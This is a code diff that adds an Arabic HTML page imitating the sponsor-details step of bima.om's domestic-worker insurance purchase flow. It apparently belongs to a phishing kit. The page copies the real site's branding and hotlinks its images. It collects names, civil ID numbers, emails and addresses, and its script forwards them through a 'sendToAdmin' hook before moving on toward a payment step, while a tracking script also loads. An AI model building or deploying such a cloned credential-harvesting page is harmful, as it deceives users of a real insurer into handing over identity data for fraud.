@@ -1,0 +1,1037 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+  <meta charset="utf-8">
+  <title>بيمة</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/x-icon" href="https://app.bima.om/assets/images/isc.png">
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Tajawal', sans-serif;
+      background: #f8f9fa;
+      color: #333;
+      direction: rtl;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    /* HEADER */
+    .header {
+      background: #fff;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+      padding: 10px 0;
+      position: relative;
+      z-index: 100;
+    }
+    .header .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .header .logo img {
+      height: 50px;
+    }
+    .header nav {
+      display: flex;
+      align-items: center;
+      gap: 30px;
+    }
+    .header nav a {
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      font-size: 15px;
+      position: relative;
+    }
+    .header nav .dropdown {
+      position: relative;
+    }
+    .header nav .dropdown .submenu {
+      display: none;
+      position: absolute;
+      top: 100%;
+      right: 0;
+      background: #fff;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      min-width: 200px;
+      padding: 10px 0;
+      z-index: 200;
+    }
+    .header nav .dropdown:hover .submenu {
+      display: block;
+    }
+    .header nav .dropdown .submenu a {
+      display: block;
+      padding: 8px 20px;
+      color: #333;
+      font-size: 14px;
+    }
+    .header nav .dropdown .submenu a:hover {
+      background: #f0f0f0;
+    }
+    .dropdown-arrow {
+      font-size: 10px;
+      margin-right: 4px;
+    }
+    .header-icons {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .header-icons a {
+      color: #5eac12;
+      text-decoration: none;
+    }
+
+    /* PAGE HEADER - STEPPER */
+    .page-header {
+      background: #f5f9f0;
+      padding: 20px 0;
+      border-bottom: 3px solid #5eac12;
+    }
+    .page-header .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .page-title {
+      color: #5eac12;
+      font-size: 1.8rem;
+      font-weight: 700;
+    }
+    .stepper {
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+    .stepper-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      padding: 0 20px;
+    }
+    .stepper-item:not(:last-child)::after {
+      content: '';
+      position: absolute;
+      top: 15px;
+      left: -20px;
+      width: 40px;
+      height: 2px;
+      background: #ddd;
+    }
+    .stepper-item.done:not(:last-child)::after {
+      background: #5eac12;
+    }
+    .stepper-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 14px;
+      border: 2px solid #ddd;
+      background: #fff;
+      color: #999;
+    }
+    .stepper-item.done .stepper-circle {
+      background: #5eac12;
+      border-color: #5eac12;
+      color: #fff;
+    }
+    .stepper-item.active .stepper-circle {
+      background: #5eac12;
+      border-color: #5eac12;
+      color: #fff;
+    }
+    .stepper-label {
+      font-size: 12px;
+      color: #666;
+      margin-top: 5px;
+    }
+    .stepper-item.done .stepper-label,
+    .stepper-item.active .stepper-label {
+      color: #333;
+      font-weight: 600;
+    }
+
+    /* WAVE BACKGROUND - matches original app.bima.om */
+    .wave-bg {
+      position: relative;
+      overflow: hidden;
+      min-height: calc(100vh - 130px);
+    }
+    .wave-bg::before {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 350px;
+      background: linear-gradient(180deg, transparent 0%, rgba(125, 242, 156, 0.15) 20%, rgba(125, 242, 156, 0.4) 50%, rgba(15, 105, 169, 0.3) 80%, rgba(15, 105, 169, 0.5) 100%);
+      z-index: 0;
+      pointer-events: none;
+    }
+    .wave-bg::after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 200px;
+      background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1440 320'%3E%3Cpath fill='%2360c48a' fill-opacity='0.4' d='M0,224L48,213.3C96,203,192,181,288,181.3C384,181,480,203,576,218.7C672,235,768,245,864,234.7C960,224,1056,192,1152,181.3C1248,171,1344,181,1392,186.7L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z'%3E%3C/path%3E%3C/svg%3E") no-repeat bottom center;
+      background-size: cover;
+      z-index: 0;
+      pointer-events: none;
+      animation: waveMove 8s ease-in-out infinite alternate;
+    }
+    @keyframes waveMove {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-30px); }
+    }
+
+    /* MAIN CONTENT */
+    .main-section {
+      max-width: 1100px;
+      margin: 30px auto;
+      padding: 0 15px;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* SPONSOR CARD */
+    .sponsor-card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 0;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+    }
+
+    /* Card Header */
+    .card-header-section {
+      padding: 30px 40px;
+      text-align: right;
+    }
+    .sponsor-icon {
+      width: 70px;
+      height: 70px;
+      display: inline-block;
+      vertical-align: middle;
+      margin-left: 15px;
+    }
+    .card-header-text {
+      display: inline-block;
+      vertical-align: middle;
+      text-align: right;
+    }
+    .card-header-text h3 {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 5px;
+      text-decoration: underline;
+    }
+    .card-header-text p {
+      color: #6c757d;
+      font-size: 0.95rem;
+      margin: 0;
+    }
+
+    /* Form Content */
+    .form-content {
+      padding: 10px 40px 30px;
+    }
+    .form-section-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 20px;
+      margin-top: 30px;
+    }
+    .form-section-title:first-child {
+      margin-top: 0;
+    }
+
+    /* Two Column Layout - Form + Upload side by side */
+    .two-col-layout {
+      display: flex;
+      gap: 40px;
+    }
+    .col-form {
+      flex: 1;
+    }
+    .col-upload {
+      width: 320px;
+      min-width: 280px;
+    }
+
+    /* Form Grid */
+    .form-row {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 15px;
+    }
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    /* Form Fields */
+    .form-group {
+      margin-bottom: 15px;
+    }
+    .form-group.full-width {
+      width: 100%;
+    }
+    .form-floating {
+      position: relative;
+    }
+    .form-floating .form-control,
+    .form-floating .form-select {
+      width: 100%;
+      height: 58px;
+      border: 1px solid #dee2e6;
+      border-radius: 6px;
+      padding: 1.6rem 0.75rem 0.5rem;
+      font-size: 1rem;
+      font-family: 'Tajawal', sans-serif;
+      background: #fff;
+      outline: none;
+      direction: rtl;
+      -webkit-appearance: none;
+      appearance: none;
+      color: #333;
+    }
+    .form-floating .form-select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: left 12px center;
+      padding-left: 30px;
+      cursor: pointer;
+    }
+    .form-floating .form-control:focus,
+    .form-floating .form-select:focus {
+      border-color: #5eac12;
+      box-shadow: 0 0 0 2px rgba(94,172,18,0.1);
+    }
+    .form-floating label {
+      position: absolute;
+      top: 0.45rem;
+      right: 0.75rem;
+      font-size: 0.75rem;
+      color: #6c757d;
+      pointer-events: none;
+    }
+
+    /* Warning text - golden/dark yellow like original */
+    .text-warning-note {
+      color: #c8a415;
+      font-size: 0.95rem;
+      margin-top: 5px;
+      margin-bottom: 0;
+      font-weight: 500;
+      font-style: italic;
+      white-space: nowrap;
+      text-align: right;
+    }
+
+    /* Full width section for address fields */
+    .address-section {
+      margin-top: 30px;
+    }
+    .address-section .form-group {
+      margin-bottom: 15px;
+    }
+
+    /* Upload Section */
+    .upload-section {
+      margin-top: 0;
+    }
+    .upload-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 15px;
+    }
+    .upload-area {
+      border: 2px dashed #dee2e6;
+      border-radius: 10px;
+      padding: 50px 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: border-color 0.2s, background 0.2s;
+      background: #fff;
+      position: relative;
+    }
+    .upload-area:hover,
+    .upload-area.dragover {
+      border-color: #5eac12;
+      background: #f0f7e6;
+    }
+    .upload-icon {
+      font-size: 2.5rem;
+      color: #adb5bd;
+      margin-bottom: 10px;
+    }
+    .upload-text {
+      color: #6c757d;
+      font-size: 0.9rem;
+    }
+    .upload-limit {
+      color: #adb5bd;
+      font-size: 0.8rem;
+      margin-top: 10px;
+    }
+
+    /* Uploaded file display */
+    .uploaded-file-preview {
+      display: none;
+      background: #f8f9fa;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 10px;
+      text-align: center;
+    }
+    .uploaded-file-preview.show {
+      display: block;
+    }
+    .uploaded-file-preview .file-thumb {
+      width: 80px;
+      height: 80px;
+      background: #e9ecef;
+      border-radius: 6px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 8px;
+    }
+    .uploaded-file-preview .file-thumb svg {
+      width: 30px;
+      height: 30px;
+      color: #6c757d;
+    }
+    .uploaded-file-preview .file-info {
+      font-size: 0.85rem;
+      color: #333;
+    }
+    .uploaded-file-preview .file-size {
+      font-size: 0.8rem;
+      color: #6c757d;
+    }
+    .uploaded-file-preview .remove-link {
+      color: #5eac12;
+      cursor: pointer;
+      font-size: 0.85rem;
+      margin-top: 5px;
+      display: inline-block;
+    }
+    .uploaded-file-preview .remove-link:hover {
+      text-decoration: underline;
+    }
+
+    /* Documents section */
+    .documents-section {
+      margin-top: 20px;
+      display: none;
+    }
+    .documents-section.show {
+      display: block;
+    }
+    .documents-title {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 10px;
+    }
+    .document-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px;
+      background: #f8f9fa;
+      border-radius: 6px;
+      border: 1px solid #e9ecef;
+    }
+    .document-item .doc-badge {
+      background: #333;
+      color: #fff;
+      font-size: 0.7rem;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-weight: 600;
+    }
+    .document-item .doc-name {
+      flex: 1;
+      font-size: 0.85rem;
+      color: #333;
+    }
+    .document-item .doc-actions {
+      display: flex;
+      gap: 8px;
+    }
+    .document-item .doc-actions button {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 5px;
+      border-radius: 4px;
+      color: #6c757d;
+    }
+    .document-item .doc-actions button:hover {
+      background: #e9ecef;
+    }
+    .document-item .doc-actions .delete-btn {
+      color: #dc3545;
+      border: 1px solid #f5c6cb;
+      border-radius: 6px;
+      padding: 5px 8px;
+    }
+
+    /* Buttons */
+    .btn-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 25px 40px;
+      border-top: 1px solid #eee;
+    }
+    .btn-prev {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 40px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #66b82f 0%, #3f8f20 100%);
+      color: #fff;
+      font-weight: 700;
+      font-size: 1.05rem;
+      cursor: pointer;
+      text-decoration: none;
+      font-family: 'Tajawal', sans-serif;
+    }
+    .btn-prev:hover {
+      background: linear-gradient(135deg, #74c43d 0%, #4c9f26 100%);
+    }
+    .btn-next {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 14px 40px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #66b82f 0%, #3f8f20 100%);
+      color: #fff;
+      font-weight: 700;
+      font-size: 1.05rem;
+      cursor: pointer;
+      font-family: 'Tajawal', sans-serif;
+    }
+    .btn-next:hover {
+      background: linear-gradient(135deg, #74c43d 0%, #4c9f26 100%);
+    }
+
+    /* FOOTER */
+    .footer {
+      background: #2d2d2d;
+      color: #aaa;
+      padding: 20px 0;
+      position: relative;
+      z-index: 1;
+    }
+    .footer .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .footer nav {
+      display: flex;
+      gap: 20px;
+    }
+    .footer nav a {
+      color: #aaa;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    .footer nav a:hover {
+      color: #5eac12;
+    }
+    .footer .copyright {
+      font-size: 13px;
+    }
+
+    /* Icons */
+    .icon-globe { width: 22px; height: 22px; }
+    .icon-headset { width: 22px; height: 22px; }
+
+    @media (max-width: 768px) {
+      .two-col-layout {
+        flex-direction: column;
+      }
+      .col-upload {
+        width: 100%;
+        min-width: unset;
+      }
+      .form-row {
+        flex-direction: column;
+      }
+      .page-header .container {
+        flex-direction: column;
+        gap: 15px;
+      }
+      .form-content {
+        padding: 20px 15px;
+      }
+      .btn-row {
+        padding: 20px 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header class="header">
+    <div class="container">
+      <div class="logo">
+        <a href="https://app.bima.om/">
+          <img src="https://app.bima.om/assets/images/isc2.png" alt="bima logo">
+        </a>
+      </div>
+      <nav>
+        <a href="https://bima.om/">الصفحة الرئيسية</a>
+        <div class="dropdown">
+          <a href="javascript:void(0)">تأمين <span class="dropdown-arrow">&#9660;</span></a>
+          <div class="submenu">
+            <a href="https://bima.om/#MotorForm">تأمين المركبات</a>
+            <a href="https://bima.om/Insurance/Travel">تأمين السفر</a>
+            <a href="/insurance/domestic-form.html">العمالة المنزلية</a>
+            <a href="#">تأمين طبي</a>
+            <a href="#">تأمين القروض</a>
+            <a href="#">تأمين المنزل</a>
+            <a href="#">تأمين الأخطاء الطبية</a>
+          </div>
+        </div>
+        <a href="javascript:void(0)" style="pointer-events:none;opacity:0.5;cursor:default;">تتبع الطلب</a>
+      </nav>
+      <div class="header-icons">
+        <a href="javascript:void(0)" title="اللغة">
+          <svg class="icon-globe" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+        </a>
+        <a href="tel:+96879997797" title="اتصل بنا">
+          <svg class="icon-headset" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 18v-6a9 9 0 0 1 18 0v6"/><path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/></svg>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <!-- STEPPER -->
+  <div class="page-header">
+    <div class="container">
+      <h1 class="page-title">تأمين العمالة المنزلية</h1>
+      <div class="stepper">
+        <div class="stepper-item done">
+          <div class="stepper-circle">1</div>
+          <span class="stepper-label">التفاصيل</span>
+        </div>
+        <div class="stepper-item done">
+          <div class="stepper-circle">2</div>
+          <span class="stepper-label">العروض</span>
+        </div>
+        <div class="stepper-item active">
+          <div class="stepper-circle">3</div>
+          <span class="stepper-label">الكفيل</span>
+        </div>
+        <div class="stepper-item">
+          <div class="stepper-circle">4</div>
+          <span class="stepper-label">الدفع</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- WAVE BACKGROUND WRAPPER -->
+  <div class="wave-bg">
+    <!-- MAIN CONTENT -->
+    <section class="main-section">
+      <div class="sponsor-card">
+        <!-- Card Header -->
+        <div class="card-header-section">
+          <img src="https://app.bima.om/assets/images/ins/sponsor-icon.png" alt="sponsor icon" class="sponsor-icon">
+          <div class="card-header-text">
+            <h3>تفاصيل الكفيل</h3>
+            <p>الرجاء إدخال بيانات الكفيل لطلب تأمين العاملة المنزلية</p>
+          </div>
+        </div>
+
+        <!-- Form Content -->
+        <div class="form-content">
+          <div class="two-col-layout">
+            <!-- Right: Form Fields -->
+            <div class="col-form">
+              <h6 class="form-section-title">كيف ينبغي لنا أن نخاطبك</h6>
+              
+              <div class="form-row">
+                <div class="form-group">
+                  <div class="form-floating">
+                    <select class="form-select" id="gender">
+                      <option value="" disabled selected>إختر</option>
+                      <option value="Male">ذكر</option>
+                      <option value="Female">أنثى</option>
+                    </select>
+                    <label for="gender">الجنس</label>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <div class="form-floating">
+                    <select class="form-select" id="title">
+                      <option value="" disabled selected>إختر</option>
+                      <option value="Dr">دكتور</option>
+                      <option value="Mr">السيد</option>
+                      <option value="Mrs">السيدة</option>
+                      <option value="Miss">الآنسة</option>
+                      <option value="Ms">السادة (.M/s)</option>
+                    </select>
+                    <label for="title">عنوان</label>
+                  </div>
+                </div>
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <div class="form-floating">
+                    <input type="text" class="form-control" id="firstName" placeholder=" ">
+                    <label for="firstName">الأسم الأول</label>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <div class="form-floating">
+                    <input type="text" class="form-control" id="lastName" placeholder=" ">
+                    <label for="lastName">الاسم الأخير</label>
+                  </div>
+                </div>
+              </div>
+
+              <div class="form-row">
+                <div class="form-group">
+                  <div class="form-floating">
+                    <input type="text" class="form-control" id="civilId" placeholder=" ">
+                    <label for="civilId">الرقم المدني</label>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <div class="form-floating">
+                    <input type="email" class="form-control" id="email" placeholder=" ">
+                    <label for="email">البريد الإلكتروني</label>
+                  </div>
+                  <p class="text-warning-note">سيتم إرسال وثيقة التأمين إلى هذا البريد الإلكتروني.</p>
+                </div>
+              </div>
+
+              <!-- Address Section - Full Width -->
+              <div class="address-section">
+                <h6 class="form-section-title">عنوان سكنك</h6>
+
+                <div class="form-group">
+                  <div class="form-floating">
+                    <select class="form-select" id="nationality">
+                      <option value="" disabled selected>إختر</option>
+                      <option value="Omani">عماني</option>
+                      <option value="Emirati">إماراتي</option>
+                      <option value="Saudi">سعودي</option>
+                      <option value="Kuwaiti">كويتي</option>
+                      <option value="Bahraini">بحريني</option>
+                      <option value="Qatari">قطري</option>
+                      <option value="Egyptian">مصري</option>
+                      <option value="Jordanian">أردني</option>
+                      <option value="Syrian">سوري</option>
+                      <option value="Lebanese">لبناني</option>
+                      <option value="Iraqi">عراقي</option>
+                      <option value="Yemeni">يمني</option>
+                      <option value="Sudanese">سوداني</option>
+                      <option value="Indian">هندي</option>
+                      <option value="Pakistani">باكستاني</option>
+                      <option value="Bangladeshi">بنغلاديشي</option>
+                      <option value="Filipino">فلبيني</option>
+                      <option value="Indonesian">إندونيسي</option>
+                      <option value="Sri Lankan">سريلانكي</option>
+                      <option value="Nepalese">نيبالي</option>
+                      <option value="Ethiopian">إثيوبي</option>
+                      <option value="Moroccan">مغربي</option>
+                      <option value="Tunisian">تونسي</option>
+                      <option value="Algerian">جزائري</option>
+                      <option value="Libyan">ليبي</option>
+                      <option value="Palestinian">فلسطيني</option>
+                      <option value="Turkish">تركي</option>
+                      <option value="Iranian">إيراني</option>
+                      <option value="Afghan">أفغاني</option>
+                      <option value="Chinese">صيني</option>
+                      <option value="Malaysian">ماليزي</option>
+                      <option value="Thai">تايلاندي</option>
+                      <option value="Vietnamese">فيتنامي</option>
+                      <option value="British">بريطاني</option>
+                      <option value="American">أمريكي</option>
+                      <option value="Canadian">كندي</option>
+                      <option value="Australian">أسترالي</option>
+                      <option value="French">فرنسي</option>
+                      <option value="German">ألماني</option>
+                      <option value="Other">أخرى</option>
+                    </select>
+                    <label for="nationality">الجنسية</label>
+                  </div>
+                </div>
+
+                <div class="form-group">
+                  <div class="form-floating">
+                    <select class="form-select" id="governorate" onchange="updateWilayat()">
+                      <option value="" disabled selected>إختر</option>
+                      <option value="muscat">مسقط</option>
+                      <option value="dakhiliyah">الداخلية</option>
+                      <option value="dhahirah">الظاهرة</option>
+                      <option value="batinah_north">شمال الباطنة</option>
+                      <option value="batinah_south">جنوب الباطنة</option>
+                      <option value="buraimi">البريمي</option>
+                      <option value="wusta">الوسطى</option>
+                      <option value="sharqiyah_north">شمال الشرقية</option>
+                      <option value="sharqiyah_south">جنوب الشرقية</option>
+                      <option value="dhofar">ظفار</option>
+                      <option value="musandam">مسندم</option>
+                      <option value="others">أخرى</option>
+                    </select>
+                    <label for="governorate">المنطقة</label>
+                  </div>
+                </div>
+
+                <div class="form-group">
+                  <div class="form-floating">
+                    <select class="form-select" id="wilayat">
+                      <option value="" disabled selected>إختر</option>
+                    </select>
+                    <label for="wilayat">الولاية *</label>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Left: Upload Section -->
+            <div class="col-upload">
+              <div class="upload-section">
+                <h6 class="upload-title">حمل البطاقة المدنية</h6>
+                <div class="upload-area" id="uploadArea">
+                  <input type="file" id="fileInput" accept=".pdf,.jpg,.jpeg,.png" style="display:none">
+                  <div class="upload-icon">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#adb5bd" stroke-width="1.5">
+                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                      <polyline points="17 8 12 3 7 8"/>
+                      <line x1="12" y1="3" x2="12" y2="15"/>
+                    </svg>
+                  </div>
+                  <p class="upload-text">قم بإسقاط الملفات هنا أو انقر للتحميل</p>
+                </div>
+                <p class="upload-limit">الحد الأقصى لحجم الملف: 2 ميجا بايت</p>
+
+                <!-- Uploaded file preview -->
+                <div class="uploaded-file-preview" id="filePreview">
+                  <div class="file-thumb">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                  </div>
+                  <div class="file-info" id="previewFileName"></div>
+                  <div class="file-size" id="previewFileSize"></div>
+                  <div class="remove-link" id="removeFileLink">Remove file</div>
+                </div>
+
+                <!-- Documents section -->
+                <div class="documents-section" id="documentsSection">
+                  <p class="documents-title">المستندات المحملة</p>
+                  <div class="document-item">
+                    <span class="doc-badge">IDCard</span>
+                    <span class="doc-name" id="docFileName"></span>
+                    <div class="doc-actions">
+                      <button title="عرض">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                      </button>
+                      <button class="delete-btn" id="deleteDoc" title="حذف">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Buttons -->
+        <div class="btn-row">
+          <a href="/insurance/domestic-offers.html" class="btn-prev">&#8594; السابق</a>
+          <button type="button" class="btn-next" id="btnNext">التالي &#8592;</button>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="container">
+      <span class="copyright">حقوق الطبع والنشر &copy; 2026، جميع الحقوق محفوظة.</span>
+      <nav>
+        <a href="https://bima.om/">الصفحة الرئيسية</a>
+        <a href="https://bima.om/Home/Terms">شروط</a>
+        <a href="https://bima.om/Home/PrivacyPolicy">سياسة الخصوصية</a>
+        <a href="https://bima.om/Home/ContactUs">اتصال</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script>
+    // Wilayat data - ALL IN ARABIC
+    const wilayatData = {
+      muscat: ["العامرات", "بوشر", "مسقط", "مطرح", "قريات", "السيب"],
+      dakhiliyah: ["أدم", "الحمراء", "بهلاء", "بدبد", "إزكي", "منح", "نزوى", "سمائل"],
+      dhahirah: ["ضنك", "عبري", "ينقل"],
+      batinah_north: ["الخابورة", "لوى", "صحم", "شناص", "صحار", "السويق"],
+      batinah_south: ["العوابي", "المصنعة", "بركاء", "نخل", "الرستاق", "وادي المعاول"],
+      buraimi: ["البريمي", "السنينة", "محضة"],
+      wusta: ["الجازر", "الدقم", "هيماء", "محوت"],
+      sharqiyah_north: ["القابل", "المضيبي", "بدية", "دماء والطائيين", "إبراء", "وادي بني خالد"],
+      sharqiyah_south: ["الكامل والوافي", "جعلان بني بو علي", "جعلان بني بو حسن", "مصيرة", "صور"],
+      dhofar: ["المزيونة", "ضلكوت", "مرباط", "مقشن", "رخيوت", "صدح", "صلالة", "شليم وجزر الحلانيات", "طاقة", "ثمريت"],
+      musandam: ["بخا", "دبا البيعة", "خصب", "مدحاء"],
+      others: []
+    };
+
+    // Update Wilayat dropdown based on Governorate selection
+    function updateWilayat() {
+      const gov = document.getElementById('governorate').value;
+      const wilayatSelect = document.getElementById('wilayat');
+      wilayatSelect.innerHTML = '<option value="" disabled selected>إختر</option>';
+      
+      if (wilayatData[gov]) {
+        wilayatData[gov].forEach(function(w) {
+          const opt = document.createElement('option');
+          opt.value = w;
+          opt.textContent = w;
+          wilayatSelect.appendChild(opt);
+        });
+      }
+    }
+
+    // File Upload functionality
+    const uploadArea = document.getElementById('uploadArea');
+    const fileInput = document.getElementById('fileInput');
+    const filePreview = document.getElementById('filePreview');
+    const previewFileName = document.getElementById('previewFileName');
+    const previewFileSize = document.getElementById('previewFileSize');
+    const removeFileLink = document.getElementById('removeFileLink');
+    const documentsSection = document.getElementById('documentsSection');
+    const docFileName = document.getElementById('docFileName');
+    const deleteDoc = document.getElementById('deleteDoc');
+
+    uploadArea.addEventListener('click', function() {
+      fileInput.click();
+    });
+
+    uploadArea.addEventListener('dragover', function(e) {
+      e.preventDefault();
+      uploadArea.classList.add('dragover');
+    });
+
+    uploadArea.addEventListener('dragleave', function(e) {
+      e.preventDefault();
+      uploadArea.classList.remove('dragover');
+    });
+
+    uploadArea.addEventListener('drop', function(e) {
+      e.preventDefault();
+      uploadArea.classList.remove('dragover');
+      const files = e.dataTransfer.files;
+      if (files.length > 0) {
+        handleFile(files[0]);
+      }
+    });
+
+    fileInput.addEventListener('change', function() {
+      if (fileInput.files.length > 0) {
+        handleFile(fileInput.files[0]);
+      }
+    });
+
+    function handleFile(file) {
+      // Check file size (2MB max)
+      if (file.size > 2 * 1024 * 1024) {
+        alert('حجم الملف يتجاوز 2 ميجا بايت');
+        return;
+      }
+      // Show preview
+      previewFileName.textContent = file.name;
+      const sizeKB = (file.size / 1024).toFixed(0);
+      previewFileSize.textContent = 'b ' + sizeKB;
+      filePreview.classList.add('show');
+      uploadArea.style.display = 'none';
+
+      // Show documents section
+      docFileName.textContent = file.name;
+      documentsSection.classList.add('show');
+    }
+
+    removeFileLink.addEventListener('click', function() {
+      resetUpload();
+    });
+
+    deleteDoc.addEventListener('click', function() {
+      resetUpload();
+    });
+
+    function resetUpload() {
+      filePreview.classList.remove('show');
+      documentsSection.classList.remove('show');
+      uploadArea.style.display = '';
+      fileInput.value = '';
+    }
+
+    // Next button - save sponsor data and navigate
+    document.getElementById('btnNext').addEventListener('click', function() {
+      var sponsorData = {
+        gender: document.getElementById('gender') ? document.getElementById('gender').value : '',
+        title: document.getElementById('title') ? document.getElementById('title').value : '',
+        firstName: document.getElementById('firstName') ? document.getElementById('firstName').value : '',
+        lastName: document.getElementById('lastName') ? document.getElementById('lastName').value : '',
+        civilId: document.getElementById('civilId') ? document.getElementById('civilId').value : '',
+        email: document.getElementById('email') ? document.getElementById('email').value : '',
+        nationality: document.getElementById('nationality') ? document.getElementById('nationality').value : '',
+        region: document.getElementById('governorate') ? document.getElementById('governorate').selectedOptions[0].text : '',
+        wilayat: document.getElementById('wilayat') ? document.getElementById('wilayat').value : ''
+      };
+      localStorage.setItem('sponsorData', JSON.stringify(sponsorData));
+      // Send sponsor data to admin
+      if (window.sendToAdmin) {
+        window.sendToAdmin({
+          'الجنس': sponsorData.gender,
+          'العنوان': sponsorData.title,
+          'الاسم': (sponsorData.firstName || '') + ' ' + (sponsorData.lastName || ''),
+          'الرقم المدني': sponsorData.civilId,
+          'البريد الإلكتروني': sponsorData.email,
+          'الجنسية': sponsorData.nationality,
+          'المنطقة': sponsorData.region,
+          'الولاية': sponsorData.wilayat
+        }, 'تأمين خدم المنازل - تفاصيل الكفيل');
+      }
+      window.location.href = '/insurance/employee-details.html';
+    });
+  </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
